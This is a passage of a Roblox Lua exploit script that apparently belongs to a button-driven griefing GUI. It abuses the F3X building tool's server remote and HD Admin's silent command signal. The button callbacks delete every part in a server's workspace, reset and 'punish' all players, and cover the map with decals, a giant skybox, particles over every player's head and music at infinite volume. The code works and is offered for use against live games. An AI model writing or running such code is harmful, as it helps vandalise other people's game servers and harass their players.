				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do
					SpawnDecal(v, side)
					AddDecal(v, id, side)
				end
			end)
		end
	end
end

-- === Call Functions ===
GiantSky("9422866248") -- giant skybox
Spam("9422866248") -- spam decals
    end
})
AddButton({
    Name = "Delete Everything",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

local function getf3x()
for _, v in ipairs(backpack:GetChildren()) do
if v:FindFirstChild("SyncAPI") then
return v
end
end
for _, v in ipairs(char:GetChildren()) do
if v:FindFirstChild("SyncAPI") then
return v
end
end
return nil
end

local f3x = getf3x()
if not f3x then
warn("❌ No F3X tool found!")
return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

local function delete(part)
local args = { "Remove", { part } }
serverendpoint:InvokeServer(unpack(args))
end

local function deleteall()
for _, v in ipairs(workspace:GetDescendants()) do
if v:IsA("BasePart") or v:IsA("UnionOperation") or v:IsA("Model") then
spawn(function() delete(v) end)
end
end
end

deleteall()
    end
})
AddButton({
    Name = "Reset all",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";re all")
    end
})
AddButton({
    Name = "Old Meme Particles",
    Callback = function()
        local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do  
    if v.Name == "SyncAPI" then  
        tool = v.Parent  
    end  
end  

for i, v in game.ReplicatedStorage:GetDescendants() do  
    if v.Name == "SyncAPI" then  
        tool = v.Parent  
    end  
end  

local remote = tool.SyncAPI.ServerEndpoint  

function _(args)  
    remote:InvokeServer(unpack(args))  
end  

function SetCollision(part, boolean)  
    local args = {  
        [1] = "SyncCollision",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["CanCollide"] = boolean  
            }  
        }  
    }  
    _(args)  
end  

function SetAnchor(boolean, part)  
    local args = {  
        [1] = "SyncAnchor",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Anchored"] = boolean  
            }  
        }  
    }  
    _(args)  
end  

function CreatePart(cf, parent)  
    local args = {  
        [1] = "CreatePart",  
        [2] = "Normal",  
        [3] = cf,  
        [4] = parent  
    }  
    _(args)  
end  

function Resize(part, size, cf)  
    local args = {  
        [1] = "SyncResize",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["CFrame"] = cf,  
                ["Size"] = size  
            }  
        }  
    }  
    _(args)  
end  

function AddDecal(part, asset, side)  
    local args = {  
        [1] = "SyncTexture",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Face"] = side,  
                ["TextureType"] = "Decal",  
                ["Texture"] = "rbxassetid://" .. asset  
            }  
        }  
    }  
    _(args)  
end  

function SpawnDecal(part, side)  
    local args = {  
        [1] = "CreateTextures",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Face"] = side,  
                ["TextureType"] = "Decal"  
            }  
        }  
    }  
    _(args)  
end  

function SetName(part, stringg)  
    local args = {  
        [1] = "SetName",  
        [2] = {  
            [1] = workspace.Part  
        },  
        [3] = stringg  
    }  
    _(args)  
end  

function SetTrans(part, int)  
    local args = {  
        [1] = "SyncMaterial",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Transparency"] = int  
            }  
        }  
    }  
    _(args)  
end  

local function delete(part)  
    local args = {  
        [1] = "Remove",  
        [2] = {  
            [1] = part  
        }  
    }  
    remote:InvokeServer(unpack(args))  
end  

local function particleEffect(textureId)
    while true do
        task.wait(0.1)
        if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            local x = hrp.Position.X + math.random(-60, 60)
            local z = hrp.Position.Z + math.random(-60, 60)
            local y = hrp.Position.Y - 50
            local spawnPosition = CFrame.new(x, y, z)

            task.spawn(function()
                CreatePart(spawnPosition, workspace)
                task.wait(0.1)

                for _, v in workspace:GetChildren() do
                    if v:IsA("Part") and (v.Position - Vector3.new(x, y, z)).Magnitude < 1 then
                        local part = v
                        SetName(part, "particle")
                        Resize(part, Vector3.new(6, 6, 0.001), part.CFrame)
                        SetCollision(part, false)
                        SetTrans(part, 1)
                        SetAnchor(true, part)
                        part.Orientation = Vector3.new(0, 0, 0)

                        SpawnDecal(part, Enum.NormalId.Front)
                        AddDecal(part, textureId, Enum.NormalId.Front)
                        SpawnDecal(part, Enum.NormalId.Back)
                        AddDecal(part, textureId, Enum.NormalId.Back)

                        local up = 90
                        for i = 2, up do
                            if part and part.Parent then
                                local newCF = part.CFrame + Vector3.new(0, 2, 0)
                                Resize(part, part.Size, newCF)
                                task.wait(0.01)
                            end
                        end

                        delete(part)
                        break
                    end
                end
            end)
        else
            task.wait(1)
        end
    end
end

local textures = {
    "12667521510",
    "12585611688",
    "76658875202103",
}

for _, texId in ipairs(textures) do
    coroutine.wrap(function()
        particleEffect(texId)
    end)()
end
    end
})
AddButton({
    Name = "k00p particles",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

--// SyncAPI Setup
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Try to find SyncAPI in player first
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
        break
    end
end
-- If not found, check ReplicatedStorage
if not tool then
    for _, v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
            break
        end
    end
end
if not tool then
    error("SyncAPI tool not found")
end

local remote = tool.SyncAPI.ServerEndpoint

--// Simple remote call wrapper
local function _(args)
    remote:InvokeServer(unpack(args))
end

--// Helper functions
local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end
local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end
local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end
local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end
local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end
local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end
local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end
local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end
local function Resize(part, size, cf)
    _({"SyncResize", {{Part = part, CFrame = cf, Size = size}}})
end
local function SpawnDecal(part, face)
    _({"CreateTextures", {{Part = part, Face = face, TextureType = "Decal"}}})
end
local function AddDecal(part, asset, face)
    _({"SyncTexture", {{Part = part, Face = face, TextureType = "Decal", Texture = "rbxassetid://"..asset}}})
end
local function SetName(part, name)
    _({"SetName", {part}, name})
end
local function SetTrans(part, val)
    _({"SyncMaterial", {{Part = part, Transparency = val}}})
end
local function delete(part)
    _({"Remove", {part}})
end

--// === Improved Particle Effect System ===
local activeParticles = {}
local particleCooldowns = {}

local function createParticleForPlayer(targetPlayer, textureId)
    -- Wait for character to load
    local character = targetPlayer.Character
    if not character then
        targetPlayer.CharacterAdded:Wait()
        character = targetPlayer.Character
    end
    
    local humanoid = character:WaitForChild("Humanoid")
    local playerKey = targetPlayer.UserId
    
    -- Initialize cooldown for this player/texture combination
    local cooldownKey = playerKey .. "_" .. textureId
    particleCooldowns[cooldownKey] = particleCooldowns[cooldownKey] or 0
    
    while true do
        local currentTime = tick()
        
        -- Check cooldown (2 seconds between particles)
        if currentTime - particleCooldowns[cooldownKey] >= 2 then
            particleCooldowns[cooldownKey] = currentTime
            
            -- Check if player and character are still valid
            if not targetPlayer or not targetPlayer.Parent or not character or not character.Parent or humanoid.Health <= 0 then
                break
            end
            
            local head = character:FindFirstChild("Head")
            if not head then
                task.wait(1)
                continue
            end

            -- Spawn particle above head
            local spawnCFrame = head.CFrame + Vector3.new(0, 3, 0)
            
            task.spawn(function()  
                CreatePart(spawnCFrame, workspace)  
                task.wait(0.1)  
                
                local newPart = nil
                for _, v in workspace:GetChildren() do  
                    if v:IsA("Part") and (v.Position - spawnCFrame.Position).Magnitude < 1 then  
                        newPart = v
                        break
                    end  
                end
                
                if newPart then
                    SetName(newPart, "particle_" .. targetPlayer.Name .. "_" .. textureId)  
                    Resize(newPart, Vector3.new(6, 6, 0.001), newPart.CFrame)  
                    SetCollision(newPart, false)  
                    SetTrans(newPart, 1)  
                    SetAnchor(newPart, true)  
                    newPart.Orientation = Vector3.new(0, 0, 0)  

                    SpawnDecal(newPart, Enum.NormalId.Front)  
                    AddDecal(newPart, textureId, Enum.NormalId.Front)  
                    SpawnDecal(newPart, Enum.NormalId.Back)  
                    AddDecal(newPart, textureId, Enum.NormalId.Back)  

                    -- Track this particle
                    local particleId = #activeParticles + 1
                    activeParticles[particleId] = newPart

                    -- Animate particle rising up
                    for i = 1, 40 do  -- Reduced frames for faster cleanup
                        if newPart and newPart.Parent and head and head.Parent then  
                            local currentHeadPos = head.Position
                            local newPosition = Vector3.new(
                                currentHeadPos.X,
                                spawnCFrame.Position.Y + (i * 2),  -- Move up 2 studs per frame
                                currentHeadPos.Z
                            )
                            local newCFrame = CFrame.new(newPosition)
                            Resize(newPart, newPart.Size, newCFrame)  
                            task.wait(0.05)  -- Slightly faster animation
                        else
                            break
                        end
                    end  
                    
                    -- Cleanup
                    if newPart and newPart.Parent then
                        delete(newPart)  
                    end
                    activeParticles[particleId] = nil
                end  
            end)  
        end
        
        task.wait(0.5) -- Check every 0.5 seconds instead of 0.1
    end
end

--// === Manage Particles for All Players ===
local function startParticleSystem()
    local textureIds = {"90174292761643"}
    local activeConnections = {}
    
    -- Function to start particles for a specific player
    local function startForPlayer(player)
        for _, texId in ipairs(textureIds) do
            coroutine.wrap(function()
                createParticleForPlayer(player, texId)
            end)()
        end
    end
    
    -- Function to stop particles for a specific player
    local function stopForPlayer(player)
        -- Clean up any particles for this player
        for particleId, part in pairs(activeParticles) do
            if part.Name:find(player.Name) and part.Parent then
                delete(part)
                activeParticles[particleId] = nil
            end
        end
    end
    
    -- Start particles for all current players
    for _, existingPlayer in ipairs(Players:GetPlayers()) do
        startForPlayer(existingPlayer)
    end
    
    -- Listen for new players
    Players.PlayerAdded:Connect(function(newPlayer)
        startForPlayer(newPlayer)
    end)
    
    -- Listen for players leaving
    Players.PlayerRemoving:Connect(function(leavingPlayer)
        stopForPlayer(leavingPlayer)
    end)
end

--// === Cleanup System ===
local function setupCleanup()
    -- Periodic cleanup of any orphaned particles
    while true do
        task.wait(10) -- Clean up every 10 seconds
        for particleId, part in pairs(activeParticles) do
            if not part or not part.Parent then
                activeParticles[particleId] = nil
            end
        end
    end
end

--// === Run Particle System ===
startParticleSystem()
coroutine.wrap(setupCleanup)()
    end 
})
AddButton({
    Name = "c00lkidd Particles",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

--// SyncAPI Setup
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Try to find SyncAPI in player first
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
        break
    end
end
-- If not found, check ReplicatedStorage
if not tool then
    for _, v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
            break
        end
    end
end
if not tool then
    error("SyncAPI tool not found")
end

local remote = tool.SyncAPI.ServerEndpoint

--// Simple remote call wrapper
local function _(args)
    remote:InvokeServer(unpack(args))
end

--// Helper functions
local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end
local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end
local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end
local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end
local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end
local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end
local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end
local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end
local function Resize(part, size, cf)
    _({"SyncResize", {{Part = part, CFrame = cf, Size = size}}})
end
local function SpawnDecal(part, face)
    _({"CreateTextures", {{Part = part, Face = face, TextureType = "Decal"}}})
end
local function AddDecal(part, asset, face)
    _({"SyncTexture", {{Part = part, Face = face, TextureType = "Decal", Texture = "rbxassetid://"..asset}}})
end
local function SetName(part, name)
    _({"SetName", {part}, name})
end
local function SetTrans(part, val)
    _({"SyncMaterial", {{Part = part, Transparency = val}}})
end
local function delete(part)
    _({"Remove", {part}})
end

--// === Improved Particle Effect System ===
local activeParticles = {}
local particleCooldowns = {}

local function createParticleForPlayer(targetPlayer, textureId)
    -- Wait for character to load
    local character = targetPlayer.Character
    if not character then
        targetPlayer.CharacterAdded:Wait()
        character = targetPlayer.Character
    end
    
    local humanoid = character:WaitForChild("Humanoid")
    local playerKey = targetPlayer.UserId
    
    -- Initialize cooldown for this player/texture combination
    local cooldownKey = playerKey .. "_" .. textureId
    particleCooldowns[cooldownKey] = particleCooldowns[cooldownKey] or 0
    
    while true do
        local currentTime = tick()
        
        -- Check cooldown (2 seconds between particles)
        if currentTime - particleCooldowns[cooldownKey] >= 2 then
            particleCooldowns[cooldownKey] = currentTime
            
            -- Check if player and character are still valid
            if not targetPlayer or not targetPlayer.Parent or not character or not character.Parent or humanoid.Health <= 0 then
                break
            end
            
            local head = character:FindFirstChild("Head")
            if not head then
                task.wait(1)
                continue
            end

            -- Spawn particle above head
            local spawnCFrame = head.CFrame + Vector3.new(0, 3, 0)
            
            task.spawn(function()  
                CreatePart(spawnCFrame, workspace)  
                task.wait(0.1)  
                
                local newPart = nil
                for _, v in workspace:GetChildren() do  
                    if v:IsA("Part") and (v.Position - spawnCFrame.Position).Magnitude < 1 then  
                        newPart = v
                        break
                    end  
                end
                
                if newPart then
                    SetName(newPart, "particle_" .. targetPlayer.Name .. "_" .. textureId)  
                    Resize(newPart, Vector3.new(6, 6, 0.001), newPart.CFrame)  
                    SetCollision(newPart, false)  
                    SetTrans(newPart, 1)  
                    SetAnchor(newPart, true)  
                    newPart.Orientation = Vector3.new(0, 0, 0)  

                    SpawnDecal(newPart, Enum.NormalId.Front)  
                    AddDecal(newPart, textureId, Enum.NormalId.Front)  
                    SpawnDecal(newPart, Enum.NormalId.Back)  
                    AddDecal(newPart, textureId, Enum.NormalId.Back)  

                    -- Track this particle
                    local particleId = #activeParticles + 1
                    activeParticles[particleId] = newPart

                    -- Animate particle rising up
                    for i = 1, 40 do  -- Reduced frames for faster cleanup
                        if newPart and newPart.Parent and head and head.Parent then  
                            local currentHeadPos = head.Position
                            local newPosition = Vector3.new(
                                currentHeadPos.X,
                                spawnCFrame.Position.Y + (i * 2),  -- Move up 2 studs per frame
                                currentHeadPos.Z
                            )
                            local newCFrame = CFrame.new(newPosition)
                            Resize(newPart, newPart.Size, newCFrame)  
                            task.wait(0.05)  -- Slightly faster animation
                        else
                            break
                        end
                    end  
                    
                    -- Cleanup
                    if newPart and newPart.Parent then
                        delete(newPart)  
                    end
                    activeParticles[particleId] = nil
                end  
            end)  
        end
        
        task.wait(0.5) -- Check every 0.5 seconds instead of 0.1
    end
end

--// === Manage Particles for All Players ===
local function startParticleSystem()
    local textureIds = {"158118263"}
    local activeConnections = {}
    
    -- Function to start particles for a specific player
    local function startForPlayer(player)
        for _, texId in ipairs(textureIds) do
            coroutine.wrap(function()
                createParticleForPlayer(player, texId)
            end)()
        end
    end
    
    -- Function to stop particles for a specific player
    local function stopForPlayer(player)
        -- Clean up any particles for this player
        for particleId, part in pairs(activeParticles) do
            if part.Name:find(player.Name) and part.Parent then
                delete(part)
                activeParticles[particleId] = nil
            end
        end
    end
    
    -- Start particles for all current players
    for _, existingPlayer in ipairs(Players:GetPlayers()) do
        startForPlayer(existingPlayer)
    end
    
    -- Listen for new players
    Players.PlayerAdded:Connect(function(newPlayer)
        startForPlayer(newPlayer)
    end)
    
    -- Listen for players leaving
    Players.PlayerRemoving:Connect(function(leavingPlayer)
        stopForPlayer(leavingPlayer)
    end)
end

--// === Cleanup System ===
local function setupCleanup()
    -- Periodic cleanup of any orphaned particles
    while true do
        task.wait(10) -- Clean up every 10 seconds
        for particleId, part in pairs(activeParticles) do
            if not part or not part.Parent then
                activeParticles[particleId] = nil
            end
        end
    end
end

--// === Run Particle System ===
startParticleSystem()
coroutine.wrap(setupCleanup)()
    end 
})
AddButton({
    Name = "Realm v2",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- small convenience: call HDAdmin commands quietly
pcall(function()
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools me")
    RequestCommand:InvokeServer(";fogcolor black")
    wait(0.4)
    RequestCommand:InvokeServer(";punish all")
end)

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

-- find F3X (SyncAPI)
local function getf3x()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    return nil
end

local f3x = getf3x()
if not f3x then warn("you don't have F3X") return end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: fast parallel invoke
local function fastInvoke(args)
    spawn(function()
        pcall(function()
            serverendpoint:InvokeServer(unpack(args))
        end)
    end)
end

-- Helpers for parts
local function delete(part)
    fastInvoke({"Remove",{part}})
end

local function resize(part, size, cf)
    fastInvoke({"SyncResize",{{["Part"]=part,["CFrame"]=cf,["Size"]=size}}})
end

local function syncmaterial(part, mate)
    fastInvoke({"SyncMaterial",{{["Part"]=part,["Material"]=mate}}})
end

local function transparency(part, trans)
    fastInvoke({"SyncMaterial",{{["Part"]=part,["Transparency"]=trans}}})
end

local function color(part, col)
    fastInvoke({"SyncColor",{{["Part"]=part,["Color"]=col,["UnionColoring"]=false}}})
end

local function name(part, str)
    fastInvoke({"SetName",{part}, str})
end

local function lock(part, bool)
    fastInvoke({"SetLocked",{part}, bool})
end

local function setcollision(part, bool)
    fastInvoke({"SyncCollision",{{["Part"]=part,["CanCollide"]=bool}}})
end

local function setanchor(part, bool)
    fastInvoke({"SyncAnchor",{{["Part"]=part,["Anchored"]=bool}}})
end

local function createdecal(part, face)
    fastInvoke({"CreateTextures",{{["Part"]=part,["Face"]=face,["TextureType"]="Decal"}}})
end

local function setdecal(part, asset, face)
    fastInvoke({"SyncTexture",{{["Part"]=part,["Face"]=face,["TextureType"]="Decal",["Texture"]="rbxassetid://"..asset}}})
end

-- === Fixed Skybox Function ===
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    local pos = cf.Position + Vector3.new(0, 6, 0)

    -- Create the skybox part with a unique name to identify it easily
    local skyboxName = "SkyboxPart_" .. tick()
    
    -- Use direct invoke for creation to get the part reference
    local success, result = pcall(function()
        return serverendpoint:InvokeServer("CreatePart", "Normal", CFrame.new(pos), workspace, skyboxName)
    end)
    
    if not success then
        -- Fallback to async method
        fastInvoke({"CreatePart", "Normal", CFrame.new(pos), workspace, skyboxName})
        wait(0.5)
    else
        -- If we got the part reference directly, use it
        if result and result:IsA("BasePart") then
            local skyboxPart = result
            setanchor(skyboxPart, true)
            fastInvoke({"CreateMeshes",{{Part = skyboxPart}}})
            fastInvoke({"SyncMesh",{{Part = skyboxPart, MeshId = "rbxassetid://111891702759441"}}})
            fastInvoke({"SyncMesh",{{Part = skyboxPart, TextureId = "rbxassetid://" .. id}}})
            fastInvoke({"SyncMesh",{{Part = skyboxPart, Scale = Vector3.new(90000, 90000, 90000)}}})
            setcollision(skyboxPart, false)
            lock(skyboxPart, true)
            name(skyboxPart, "GiantSkybox")
            return
        end
    end
    
    -- Search for the created part with retry logic
    local skyboxPart = nil
    local attempts = 0
    while not skyboxPart and attempts < 10 do
        for _, v in workspace:GetDescendants() do
            if v:IsA("BasePart") and (v.Name == skyboxName or (v.Position - pos).Magnitude < 5) then
                skyboxPart = v
                break
            end
        end
        if not skyboxPart then
            wait(0.1)
            attempts = attempts + 1
        end
    end
    
    if skyboxPart then
        setanchor(skyboxPart, true)
        fastInvoke({"CreateMeshes",{{Part = skyboxPart}}})
        fastInvoke({"SyncMesh",{{Part = skyboxPart, MeshId = "rbxassetid://111891702759441"}}})
        fastInvoke({"SyncMesh",{{Part = skyboxPart, TextureId = "rbxassetid://" .. id}}})
        fastInvoke({"SyncMesh",{{Part = skyboxPart, Scale = Vector3.new(90000, 90000, 90000)}}})
        setcollision(skyboxPart, false)
        lock(skyboxPart, true)
        name(skyboxPart, "GiantSkybox")
    else
        warn("Skybox part not found after creation attempts")
    end
end

-- Delete all existing parts
for _, v in ipairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("UnionOperation") then
        spawn(function()
            pcall(function() delete(v) end)
        end)
    end
end

wait(0.8) -- Increased delay to ensure cleanup completes

-- Create skybox first
GiantSky("99706029040118")

wait(0.5) -- Wait for skybox to be created

-- ROOM PARAMETERS
local ROOM_SIZE = Vector3.new(60,20,40)
local WALL_THICKNESS = 2
local FLOOR_THICKNESS = 2
local ROOM_Y = 5
local ROOM_CENTER = CFrame.new(0, ROOM_Y, 0)

-- Fast create function
local function createFastPart(partType, cf, size, material, col, nameStr, anchored, collide, extra)
    spawn(function()
        local part = serverendpoint:InvokeServer("CreatePart", partType, cf, workspace)
        if part then
            resize(part, size, cf)
            syncmaterial(part, material)
            color(part, col)
            name(part, nameStr)
            lock(part, true)
            setanchor(part, anchored)
            setcollision(part, collide)
            if extra then extra(part) end
        end
    end)
end

-- FLOOR
createFastPart("Normal",
    ROOM_CENTER * CFrame.new(0, - (ROOM_SIZE.Y/2) + (FLOOR_THICKNESS/2), 0),
    Vector3.new(ROOM_SIZE.X, FLOOR_THICKNESS, ROOM_SIZE.Z),
    Enum.Material.Concrete,
    Color3.fromRGB(150,150,150),
    "RoomFloor",
    true,
    true
)

-- CEILING
createFastPart("Normal",
    ROOM_CENTER * CFrame.new(0,(ROOM_SIZE.Y/2) - (FLOOR_THICKNESS/2),0),
    Vector3.new(ROOM_SIZE.X,FLOOR_THICKNESS,ROOM_SIZE.Z),
    Enum.Material.SmoothPlastic,
    Color3.fromRGB(230,230,230),
    "RoomRoof",
    true,
    true
)

-- WALLS
local halfX = ROOM_SIZE.X / 2
local halfZ = ROOM_SIZE.Z / 2
local wallHeight = ROOM_SIZE.Y - (FLOOR_THICKNESS*2)

-- Back wall
createFastPart("Normal",
    ROOM_CENTER * CFrame.new(0,0,halfZ-(WALL_THICKNESS/2)),
    Vector3.new(ROOM_SIZE.X,wallHeight,WALL_THICKNESS),
    Enum.Material.Brick,
    Color3.fromRGB(200,200,200),
    "BackWall",
    true,
    true
)

-- Front wall with door
local doorWidth = 8
local sideWallWidth = (ROOM_SIZE.X - doorWidth)/2

createFastPart("Normal",
    ROOM_CENTER * CFrame.new(- (doorWidth/2) - (sideWallWidth/2), 0, -halfZ + (WALL_THICKNESS/2)),
    Vector3.new(sideWallWidth, wallHeight, WALL_THICKNESS),
    Enum.Material.Brick,
    Color3.fromRGB(200,200,200),
    "FrontWallLeft",
    true,
    true
)

createFastPart("Normal",
    ROOM_CENTER * CFrame.new((doorWidth/2) + (sideWallWidth/2), 0, -halfZ + (WALL_THICKNESS/2)),
    Vector3.new(sideWallWidth, wallHeight, WALL_THICKNESS),
    Enum.Material.Brick,
    Color3.fromRGB(200,200,200),
    "FrontWallRight",
    true,
    true
)

-- Left wall
createFastPart("Normal",
    ROOM_CENTER * CFrame.new(-halfX + (WALL_THICKNESS/2),0,0),
    Vector3.new(WALL_THICKNESS, wallHeight, ROOM_SIZE.Z),
    Enum.Material.Brick,
    Color3.fromRGB(200,200,200),
    "LeftWall",
    true,
    true
)

-- Right wall
createFastPart("Normal",
    ROOM_CENTER * CFrame.new(halfX - (WALL_THICKNESS/2),0,0),
    Vector3.new(WALL_THICKNESS, wallHeight, ROOM_SIZE.Z),
    Enum.Material.Brick,
    Color3.fromRGB(200,200,200),
    "RightWall",
    true,
    true
)

-- Poster on right interior wall
local posterId = "83022346908747"
local posterHeight = 10
local posterWidth = 8
local posterThickness = 0.2
local posterX = halfX - WALL_THICKNESS - (posterThickness/2)

createFastPart("Normal",
    CFrame.new(posterX, ROOM_CENTER.Y, 0),
    Vector3.new(posterThickness, posterHeight, posterWidth),
    Enum.Material.SmoothPlastic,
    Color3.fromRGB(255,255,255),
    "RulesPoster_RightWall",
    true,
    false,
    function(part)
        createdecal(part, Enum.NormalId.Left)
        setdecal(part, posterId, Enum.NormalId.Left)
    end
)

-- Fountain
local fountainCenterCF = ROOM_CENTER * CFrame.new(0, - (ROOM_SIZE.Y/2) + FLOOR_THICKNESS + 1.5, 0)

-- Basin
createFastPart("Normal", fountainCenterCF, Vector3.new(14,2,14), Enum.Material.Slate, Color3.fromRGB(120,120,120), "FountainBasin", true, true)
createFastPart("Normal", fountainCenterCF * CFrame.new(0,1.1,0), Vector3.new(12.5,0.6,12.5), Enum.Material.SmoothPlastic, Color3.fromRGB(100,100,100), "BasinInnerRim", true, true)
-- Pillar & top plate
createFastPart("Normal", fountainCenterCF * CFrame.new(0,3.5,0), Vector3.new(2,7,2), Enum.Material.Slate, Color3.fromRGB(140,140,140), "FountainPillar", true, true)
createFastPart("Normal", fountainCenterCF * CFrame.new(0,7.7,0), Vector3.new(6,0.6,6), Enum.Material.SmoothPlastic, Color3.fromRGB(160,160,160), "TopPlate", true, true)
-- Water
createFastPart("Normal", fountainCenterCF * CFrame.new(0,0.35,0), Vector3.new(11.7,1.0,11.7), Enum.Material.Glass, Color3.fromRGB(80,160,255), "FountainWater", true, false, function(part)
    transparency(part,0.45)
end)
-- Drip drops
for i=1,6 do
    local dripCF = fountainCenterCF * CFrame.new(0,7.7 - (i * 0.4), 0)
    createFastPart("Normal", dripCF, Vector3.new(1.2,0.35,1.2), Enum.Material.Glass, Color3.fromRGB(120,185,255), "FountainDrip_"..i, true, false, function(part)
        transparency(part,0.35 + (i*0.03))
    end)
end
-- Rocks
local stonePositions = {
    Vector3.new(8.5,0.6,0),
    Vector3.new(-8.5,0.6,0),
    Vector3.new(0,0.6,8.5),
    Vector3.new(0,0.6,-8.5)
}
for i,pos in ipairs(stonePositions) do
    createFastPart("Normal", fountainCenterCF * CFrame.new(pos.X,pos.Y,pos.Z), Vector3.new(0.9,1.2,0.9), Enum.Material.Slate, Color3.fromRGB(90,90,90), "FountainRock_"..i, true, true)
end

-- Outside grass
local grassDepth = 48
local grassWidth = ROOM_SIZE.X + 20
local grassHeight = 0.6
createFastPart("Normal", ROOM_CENTER * CFrame.new(0, - (ROOM_SIZE.Y/2) + (grassHeight/2) + FLOOR_THICKNESS, -halfZ - (grassDepth/2)), Vector3.new(grassWidth, grassHeight, grassDepth), Enum.Material.Grass, Color3.fromRGB(85,170,60), "OutsideGrass", true, true)

-- Spawn location
local spawnCF = ROOM_CENTER * CFrame.new(0, - (ROOM_SIZE.Y/2) + grassHeight + 0.1, -halfZ - 10) * CFrame.Angles(0, math.rad(180), 0)
createFastPart("Spawn", spawnCF, Vector3.new(4,0.2,4), Enum.Material.Neon, Color3.fromRGB(255,255,0), "SpawnLocationOutside", true, true, function(part)
    transparency(part,0.3)
    createdecal(part, Enum.NormalId.Top)
end)

-- Interior lights
for i=1,4 do
    local offsetX = - (ROOM_SIZE.X/2) + 6 + ((i-1) * (ROOM_SIZE.X - 12)/3)
    local lightCF = ROOM_CENTER * CFrame.new(offsetX,(ROOM_SIZE.Y/2)-3,-(ROOM_SIZE.Z/2)+4)
    createFastPart("Normal", lightCF, Vector3.new(2,1,2), Enum.Material.Neon, Color3.fromRGB(200,200,255), "InteriorLight_"..i, true, false)
end

-- Optional map settings and music
wait(2) -- Wait for everything to build first
pcall(function()
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";fogcolor black ;time")
    wait(0.2)
    RequestCommand:InvokeServer(";res all")
    wait(0.2)
    RequestCommand:InvokeServer(";r6 all")
    wait(0.2)
    RequestCommand:InvokeServer(";time 14")
    wait(2.0)
    RequestCommand:InvokeServer(";music 92512466676196 ;pitch 0.125 ;volume inf")
wait(1.5)
RequestCommand:InvokeServer(";disco ;time 0")
end)

print("Map generation complete!")
    end
})
AddButton({
    Name = "Skybox V2",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";time 0")
SilentRequest:InvokeServer(";fogcolor black")
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Locate SyncAPI tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
        break
    end
end
if not tool then
    for _, v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
            break
